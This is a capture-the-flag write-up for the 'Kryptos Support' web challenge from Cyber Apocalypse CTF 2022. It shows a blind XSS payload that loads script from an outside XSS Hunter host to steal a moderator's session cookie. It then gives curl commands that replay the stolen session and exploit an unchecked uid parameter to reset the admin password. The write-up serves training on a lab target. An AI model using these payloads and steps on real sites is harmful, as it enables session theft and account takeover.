Kryptos Support
----------
Cyber Apocalypse CTF 2022 - Intergalactic Chase

Category: Web

Points: 300

Difficulty: 1/4

# Challenge Info
```
The secret vault used by the Longhir's planet council, Kryptos, contains some very sensitive state secrets that Virgil and Ramona 
are after to prove the injustice performed by the commission. Ulysses performed an initial recon at their request and found a 
support portal for the vault. Can you take a look if you can infiltrate this system?
```

# Solutions
This challenge deals with blind cross-site scripting (XSS) vulnerability. What does that mean? We can put JavaScript code into the `<textarea>` provided, however, we won't see the output of said code. Workaround? I recently learned about a tool to beat blind XSS on TryHackMe (https://tryhackme.com/room/xssgi) called XSS Hunter (https://xsshunter.com/). You could've built your own tool with JavaScript, but this is a lot faster and comes with some benefits. XSS Hunter has created payloads for you to test blind XSS. For Kryptos Support, I used `"><script src=https://pjs7593.xss.ht></script>`, `https://pjs7593.xss.ht` being a link XSS Hunter also provides unique to everyone. It worked!

XSS Hunter returned information about the webpage that couldn't be seen from inspecting the webpage's source code. It obtains the following information:
- Screenshot of the page
- Vulnerable Page URL
- Execution Origin
- User IP Address
- Referer
- Victim User-Agent
- Cookies
- DOM
- Injection Point (Raw HTTP Request)
- and the ability to generate a markdown report.

Now that we've confirmed it's blind XSS it's time to attack! From inspecting Kryptos Support's HTML pages and JavaScript pages we know there is a `/login` and `/tickets` page. Also thanks to XSS Hunter we've obtained the session ID of a user, `session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI2MTg0NjV9.LJ9MFwDABdTO-1XWXJ480YnguQozen8z17qncPPB64w`.

Execute`curl http://206.189.126.144:30887/tickets -b 'session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI2MTg0NjV9.LJ9MFwDABdTO-1XWXJ480YnguQozen8z17qncPPB64w'`


## Tickets Page
We now have access to the `tickets` page and have bypassed the login form! You'll also notice we're currently logged in as moderator!
```html
<html lang="en">
   <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <meta http-equiv="X-UA-Compatible" content="ie=edge">
      <link rel="icon" type="image/x-icon" href="/static/images/favicon.png">
      <title>Kryptos Vault</title>
      <link rel="stylesheet" href="/static/css/tickets.css">
   </head>
   <body>
        <nav class="nav-bar">
            <ul>
                <li>
                    <a href="/settings">Settings</a>
                </li>
            </ul>
        </nav>
        <nav class="logged-bar">
           <ul>
               <li>
                   logged in as (moderator), <a href="/logout">logout</a>
               </li>
           </ul>
       </nav>
      <div class="container on">
         <div class="screen">
            <h3 class="title">
               Kryptos Vault Support tickets
            </h3>
            <div class="message-container">
                
                    <div class="ticket-card">
                        <div class="c1"><span>Submitted </span></div>
                        <div class="c2"><p>2022-05-15 12:03:12</p></div>
                        <div class="c1"><span>Message </span></div>
                        <div class="c2"><p>I have lost my rfid for the vault. My vault serial is 000083921. Please send me a new rfid.</p></div>
                    </div>
                
                    <div class="ticket-card">
                        <div class="c1"><span>Submitted </span></div>
                        <div class="c2"><p>2022-05-15 12:03:12</p></div>
                        <div class="c1"><span>Message </span></div>
                        <div class="c2"><p>Vault 000076439 requires maintenance.</p></div>
                    </div>
                
                    <div class="ticket-card">
                        <div class="c1"><span>Submitted </span></div>
                        <div class="c2"><p>2022-05-15 12:10:28</p></div>
                        <div class="c1"><span>Message </span></div>
                        <div class="c2"><p>"><script src=https://pjs7593.xss.ht></script></p></div>
                    </div>
            </div>
         </div>
      </div>
   </body>
</html>       
```
The serial numbers might be unique to users and useful, but it's unclear at the moment. `000083921` and `000076439` are the only two visible serial numbers.

## Settings Page
Poking around I decided to look at `/settings`. You'll notice in the code snippet above, that this new page was listed in the navigation bar.
```html
   <body>
        <nav class="nav-bar">
            <ul>
                <li>
                    <a href="/tickets">Tickets</a>
                </li>
            </ul>
        </nav>
        <nav class="logged-bar">
           <ul>
               <li>
                   logged in as (moderator), <a href="/logout">logout</a>
               </li>
           </ul>
       </nav>
      <div class="container on">
         <div class="screen">
            <h3 class="title">
               Kryptos Vault Support Settings
            </h3>
            <div class="settings-container">
                    <div class="settings-card">
                        <input type="hidden" id="uid" value="100">
                        <div class="c1"><span>New password </span></div>
                        <div class="c2"><p><input type="text" id="password1" class="password"></p></div>
                        <div class="c1"><span>Re-type password </span></div>
                        <div class="c2"><p><input type="text" id="password2" class="password"></p></div>
                    </div>
                    <br>
                    <b class="flash text-center" id="resp-msg">ACCESS DENIED</b>
                    <div class="row text-center">
                        <button  id="update-btn" name="submit">[update]</button>
                     </div>
            </div>
         </div>
      </div>
      <script type="text/javascript" src="/static/js/jquery-3.6.0.slim.min.js"></script>
      <script type="text/javascript" src="/static/js/settings.js"></script>
   </body>
</html>    
```
`/settings` allows us to change users' passwords.

## Javascript for /settings
I decided to look at `/static/js/settings.js` to see how exactly the password is being changed and if anything was necessary.
```javascript
$(document).ready(function() {
	$("#update-btn").on('click', updatePassword);

});

async function updatePassword() {

	$('#update-btn').prop('disabled', true);

	let card = $("#resp-msg");
    card.text('Updating password, please wait');
	card.show();

	let uid = $("#uid").val();
	let password1 = $("#password1").val();
	let password2 = $("#password2").val();

	if ($.trim(password1) === '' || password1 !== password2) {
		$('#update-btn').prop('disabled', false);
		card.text("Please type-in the same password!");
		card.show();
		return;
	}

	await fetch(`/api/users/update`, {
			method: 'POST',
			headers: {
				'Content-Type': 'application/json',
			},
			body: JSON.stringify({password: password1, uid}),
		})
		.then((response) => response.json()
			.then((resp) => {
				card.text(resp.message);
				card.show();
			}))
		.catch((error) => {
			card.text(error);
			card.show();
		});

    $('#update-btn').prop('disabled', false);
}                                            
```
Reviewing the code above, it appears we only need to include the passwords and the uid (maybe the serial number?).

Executing `curl -X POST http://206.189.126.144:30887/api/users/update -H "Content-Type: application/json" -b 'session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI2MTg0NjV9.LJ9MFwDABdTO-1XWXJ480YnguQozen8z17qncPPB64w' -d '{"password":"password123","password1":"password123","uid":"SERIAL"}'`, replacing `SERIAL` with `000083921` or `000076439` doesn't work. They both will return `{"message":"The user doesn't exist!"}`. 

I decided to go back to the infamous 0 as the uid and increment from there. I tried `0` as the UID, but that also returned a `{"message":"The user doesn't exist!"}`. However, `1` works! Not only did we update the password, but we updated the admin password `{"message":"Password for admin changed successfully!"}`. Going back to the login form and entering the new credentials `admin:password123` reveals the flag.
